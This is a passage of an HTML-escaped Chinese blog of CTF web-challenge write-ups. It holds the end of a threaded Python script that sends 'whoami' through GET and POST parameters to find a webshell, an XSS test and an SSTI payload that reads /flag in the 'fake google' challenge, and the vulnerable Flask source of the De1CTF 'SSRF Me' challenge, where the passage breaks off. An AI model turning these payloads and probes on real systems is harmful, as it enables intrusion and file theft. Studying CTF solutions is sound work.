class=&#34;hljs-comment&#34;&gt;#ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST&lt;/span&gt;&lt;br&gt;    req.close()												&lt;span class=&#34;hljs-comment&#34;&gt;# å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜&lt;/span&gt;&lt;br&gt;    req.encoding = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;&lt;br&gt;    content = req.text&lt;br&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;#print(content)&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;32720&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; content:									&lt;span class=&#34;hljs-comment&#34;&gt;#å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•°&lt;/span&gt;&lt;br&gt;        flag = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; a &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; gets:&lt;br&gt;            req = session.get(url+&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;?%s=&amp;#x27;&lt;/span&gt;%a+&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;)&lt;br&gt;            content = req.text&lt;br&gt;            req.close()												&lt;span class=&#34;hljs-comment&#34;&gt;# å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜&lt;/span&gt;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;32720&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; content:&lt;br&gt;                flag = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; flag != &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; b &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; posts:&lt;br&gt;                req = session.post(url, data=&amp;#123;b:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;&amp;#125;)&lt;br&gt;                content = req.text&lt;br&gt;                req.close()												&lt;span class=&#34;hljs-comment&#34;&gt;# å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜&lt;/span&gt;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;32720&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; content:&lt;br&gt;                    &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; flag == &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:													&lt;span class=&#34;hljs-comment&#34;&gt;#flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ&lt;/span&gt;&lt;br&gt;            param = a&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;            param = b&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š &amp;#x27;&lt;/span&gt;+file+&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s&amp;quot;&lt;/span&gt; %param)&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ç»“æŸæ—¶é—´ï¼š  &amp;#x27;&lt;/span&gt; + time.asctime(time.localtime(time.time())))&lt;br&gt;    s1.release()&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; files:															&lt;span class=&#34;hljs-comment&#34;&gt;#åŠ å…¥å¤šçº¿ç¨‹&lt;/span&gt;&lt;br&gt;   t = threading.Thread(target=get_content, args=(i,))&lt;br&gt;   t.start()&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æœç„¶è¿˜æ˜¯èœçš„æƒ¨ä¸å¿ç¹&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;bjdctf-2ndfake-google&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bjdctf-2ndfake-google&#34;&gt;#&lt;/a&gt; [BJDCTF 2nd]fake google&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;æµ‹è¯• &lt;code&gt;&amp;lt;script&amp;gt;alert(111)&amp;lt;/script&amp;gt;&lt;/code&gt;  å¯ä»¥æ‰§è¡Œ&lt;/li&gt;
&lt;li&gt;æŸ¥çœ‹ç½‘é¡µæºä»£ç æç¤º ssti&lt;/li&gt;
&lt;li&gt;?name=3æµ‹è¯•çš„ç¡®å­˜åœ¨ ssti&lt;/li&gt;
&lt;li&gt;æœ€ç»ˆ payloadï¼š &lt;code&gt;?name=&amp;#123;&amp;#123;True.__class__.__mro__[1].__subclasses__()[177].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;/flag&#39;).read()&amp;#125;&amp;#125;&lt;/code&gt;  ç›´æ¥æ‹¿åˆ° flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;de1ctf-2019ssrf-me&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#de1ctf-2019ssrf-me&#34;&gt;#&lt;/a&gt; [De1CTF 2019]SSRF Me&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;è®¿é—®æ‹¿åˆ°æºç ï¼Œæºç å®¡è®¡&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#! /usr/bin/env python&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#encoding=utf-8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; flask &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; Flask&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; flask &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; request&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; socket&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; hashlib&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; urllib&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; sys&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; os&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; json&lt;br&gt;reload(sys)&lt;br&gt;sys.setdefaultencoding(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;latin1&amp;#x27;&lt;/span&gt;)&lt;br&gt;&lt;br&gt;app = Flask(__name__)&lt;br&gt;&lt;br&gt;secert_key = os.urandom(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Task&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__init__&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self, action, param, sign, ip&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;        self.action = action&lt;br&gt;        self.param = param&lt;br&gt;        self.sign = sign&lt;br&gt;        self.sandbox = md5(ip)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;not&lt;/span&gt; os.path.exists(self.sandbox)):          &lt;span class=&#34;hljs-comment&#34;&gt;#SandBox For Remote_Addr&lt;/span&gt;&lt;br&gt;            os.mkdir(self.sandbox)&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Exec&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;        result = &amp;#123;&amp;#125;&lt;br&gt;        result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;500&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (self.checkSign()):&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;scan&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; self.action:&lt;br&gt;                tmpfile = &lt;span class=&#34;hljs-built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;./%s/result.txt&amp;quot;&lt;/span&gt; % self.sandbox, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;w&amp;#x27;&lt;/span&gt;)&lt;br&gt;                resp = scan(self.param)&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (resp == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Connection Timeout&amp;quot;&lt;/span&gt;):&lt;br&gt;                    result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;data&amp;#x27;&lt;/span&gt;] = resp&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;                    &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt; resp&lt;br&gt;                    tmpfile.write(resp)&lt;br&gt;                    tmpfile.close()&lt;br&gt;                result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;read&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; self.action:&lt;br&gt;                f = &lt;span class=&#34;hljs-built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;./%s/result.txt&amp;quot;&lt;/span&gt; % self.sandbox, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;)&lt;br&gt;                result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;&lt;br&gt;                result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;data&amp;#x27;&lt;/span&gt;] = f.read()&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;] == &lt;span class=&#34;hljs-number&#34;&gt;500&lt;/span&gt;:&lt;br&gt;                result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;data&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Action Error&amp;quot;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;            result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;500&lt;/span&gt;&lt;br&gt;            result[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;msg&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Sign Error&amp;quot;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;checkSign&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (getSign(self.action, self.param) == self.sign):&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;False&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#generate Sign For Action Scan.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;@app.route(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/geneSign&amp;quot;&lt;/span&gt;, methods=[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;GET&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;]&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;geneSign&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;    param = urllib.unquote(request.args.get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;param&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;))&lt;br&gt;    action = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;scan&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; getSign(action, param)&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;@app.route(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/De1ta&amp;#x27;&lt;/span&gt;,methods=[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;GET&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;]&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;challenge&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;    action = urllib.unquote(request.cookies.get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;action&amp;quot;&lt;/span&gt;))&lt;br&gt;    param = urllib.unquote(request.args.get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;param&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;))&lt;br&gt;    sign = urllib.unquote(request.cookies.get(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;sign&amp;quot;&lt;/span&gt;))&lt;br&gt;    ip = request.remote_addr&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(waf(param)):&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;No Hacker!!!!&amp;quot;&lt;/span&gt;&lt;br&gt;    task = Task(action, param, sign, ip)&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; json.dumps(task.Exec())&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;@app.route(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;index&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;code.txt&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;).read()&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;scan&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;param&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    socket.setdefaulttimeout(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; urllib.urlopen(param).read()[:&lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;]&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;except&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Connection Timeout&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;getSign&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;action, param&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; hashlib.md5(secert_key + param + action).hexdigest()&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;md5&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; 